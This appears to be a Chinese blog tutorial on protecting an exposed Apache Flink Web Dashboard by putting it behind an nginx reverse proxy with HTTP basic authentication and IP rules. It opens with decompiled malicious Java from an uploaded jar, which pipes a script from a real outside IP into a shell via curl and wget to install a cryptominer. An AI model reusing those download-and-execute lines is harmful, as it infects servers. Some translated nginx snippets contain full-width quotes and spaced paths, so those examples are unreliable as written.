# 【漏洞修复】修复 Apache Flink Web Dashboard 未授权访问致远程命令执行漏洞

## 介绍

攻击者通过Flink Web Dashboard上传含有恶意代码的jar包进行攻击，中招会使服务器占满CPU沦为挖矿机，非常猖獗

通过反编译得到的恶意代码：

```
package com.example;

import java.io.IOException;

public class Main {
    public Main() {
    }

    public static void main(String[] var0) throws IOException {
        String var1 = "142.44.191.122/f.sh";
        String var2 = "curl " + var1 + "|sh";
        String[] var3 = new String[]{"/bin/bash", "-c", var2};
        Runtime.getRuntime().exec(var3);
        String var4 = "wget -q -O - " + var1 + "|sh";
        String[] var5 = new String[]{"/bin/bash", "-c", var4};
        Runtime.getRuntime().exec(var5);
    }
}
```





## 思路：Nignx使用HTTP基本身份验证限制访问



## 介绍

您可以通过实现用户名/密码身份验证来限制对网站或网站某些部分的访问。用户名和密码取自由密码文件创建工具创建并填充的文件，例如`apache2-utils`。

HTTP基本身份验证也可以与其他访问限制方法结合使用，例如通过[IP地址](https://docs.nginx.com/nginx/admin-guide/security-controls/blacklisting-ip-addresses/)或[地理位置](https://docs.nginx.com/nginx/admin-guide/security-controls/controlling-access-by-geoip/)限制访问。



## 先决条件

- NGINX
- 密码文件创建实用程序，例如`apache2-utils`（Debian，Ubuntu）或`httpd-tools`（RHEL / CentOS / Oracle Linux）。 htpasswd是Apache的Web服务器内置工具，用于创建和更新储存用户名、域和用户基本认证的密码文件 。

## 创建密码文件

要创建用户名-密码对，请使用密码文件创建实用程序，例如，`apache2-utils`或`httpd-tools`

1. 确认已安装`apache2-utils`（Debian，Ubuntu）或`httpd-tools`（RHEL / CentOS / Oracle Linux）。

2. 创建密码文件和第一个用户。运行`htpasswd`带有`-c`标志的实用程序（以创建一个新文件），文件路径名作为第一个参数，用户名作为第二个参数：

   ```
   [root@Young conf.d]# htpasswd -c /etc/nginx/conf.d/.htpasswd RobinWang
   New password: 
   Re-type new password: 
   Adding password for user RobinWang
   ```

   按Enter，然后在提示时键入**RobinWang**的密码。

3. 创建其他用户密码对。省略`-c`标志，因为文件已经存在：

   ```
   $ sudo htpasswd /etc/nginx/conf.d/.htpasswd user2
   ```

4. 您可以确认该文件包含成对的用户名和加密的密码：

   ```
   [root@Young conf.d]# cat /etc/nginx/conf.d/.htpasswd 
   RobinWang:********/********.********.********
   user2:********/********.********.********
   ```





## 配置NGINX和NGINX Plus以进行HTTP基本身份验证

1. 在要保护的位置内，指定[`auth_basic`](https://nginx.org/en/docs/http/ngx_http_auth_basic_module.html#auth_basic)指令并为密码保护的区域命名。询问凭据时，该区域的名称将显示在用户名/密码对话框窗口中：

   ```
   location  / api  { 
       auth_basic  “管理员 区域” ; 
       ＃... 
   }
   ```

2. [`auth_basic_user_file`](https://nginx.org/en/docs/http/ngx_http_auth_basic_module.html#auth_basic_user_file)使用包含用户/密码对的*.htpasswd*文件的路径指定指令：

   ```
   location  / api  { 
       auth_basic            “管理员 区域” ; 
       auth_basic_user_file  /etc/apache2/.htpasswd ;  
   }
   ```

另外，您可以使用基本身份验证来限制对整个网站的访问，但仍将某些网站区域设为公开。在这种情况下，请指定指令的`off`参数，该[`auth_basic`](https://nginx.org/en/docs/http/ngx_http_auth_basic_module.html#auth_basic)指令取消从较高配置级别的继承：

```
server {
    ...
    auth_basic           "Administrator’s Area";
    auth_basic_user_file conf/htpasswd;

    location /public/ {
        auth_basic off;
    }
}
```



## 将基本身份验证与IP地址的访问限制相结合

HTTP基本身份验证可以有效地结合IP地址的访问限制。您可以至少实现两种方案：

- 用户必须经过身份验证并具有有效的IP地址
- 用户必须经过身份验证或具有有效的IP地址

1. 使用[`allow`](https://nginx.org/en/docs/http/ngx_http_access_module.html#allow)和[`deny`](https://nginx.org/en/docs/http/ngx_http_access_module.html#deny)指令允许或拒绝来自特定IP地址的访问：

   ```
   location /api {
       #...
       deny  192.168.1.2;
       allow 192.168.1.1/24;
       allow 127.0.0.1;
       deny  all;
   }
   ```

   仅对`192.168.1.1/24`网络（`192.168.1.2`地址除外）授予访问权限。请注意，`allow`和`deny`指令将按其定义的顺序应用。

2. 将IP和HTTP身份验证的限制与[`satisfy`](https://nginx.org/en/docs/http/ngx_http_core_module.html#satisfy)指令结合使用。如果将指令设置为`all`，如果客户端同时满足两个条件，则将授予访问权限。如果将指令设置为`any`，如果客户端满足至少一个条件，则将授予访问权限：

这里我没有公网地址客户端就不用了

## Nginx反向代理

首先修改Flink的Web前端配置

```
rest.port: 8084

# The address to which the REST client will connect to
#
rest.address: 127.0.0.1

```

将Flink的Web前端设置为 **回送地址** 的端口

然后使用反向代理这个地址

```
			proxy_set_header Host $host;
    		proxy_set_header X-Real-IP $remote_addr;
    		proxy_pass http://127.0.0.1:8084;

```



## 完整的例子

该示例显示了如何通过简单身份验证以及IP地址访问限制来保护您的状态区域：

```
    server {
        listen 0.0.0.0:8081;
        #root   /usr/share/nginx/html;

        location / {
			proxy_set_header Host $host;
    		proxy_set_header X-Real-IP $remote_addr;
    		proxy_pass http://127.0.0.1:8084;
            auth_basic           "Apache Flink Dashboard :)";
            auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
        }
    }


```

配置好了之后记得Reload一下

```
# nginx -s reload 

```



当您访问状态页面时，系统会提示您登录：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200115165117157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1ODE1NTI3,size_16,color_FFFFFF,t_70)

如果提供的名称和密码与密码文件不匹配，则会出现错误。`401 (Authorization Required)`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200115165140764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1ODE1NTI3,size_16,color_FFFFFF,t_70)

